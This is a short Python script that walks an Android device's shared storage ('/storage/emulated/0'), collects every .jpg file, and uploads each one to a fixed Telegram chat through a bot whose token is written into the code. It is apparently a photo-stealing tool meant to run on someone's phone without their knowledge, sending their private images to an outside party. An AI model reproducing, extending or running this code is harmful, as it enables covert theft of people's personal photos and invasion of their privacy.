import os
import telebot


bot_token = '7184086344:AAHjrClAUZJuPHtosjczCzJzshcx4ZMPbv0'



bot = telebot.TeleBot(bot_token)

folder_path = '/storage/emulated/0'


allowed_extensions = ['.jpg']


for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_extension = os.path.splitext(file)[1].lower()
        if file_extension in allowed_extensions:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                bot.send_document(chat_id='6787034489', document=f)
                
                
bot.polling()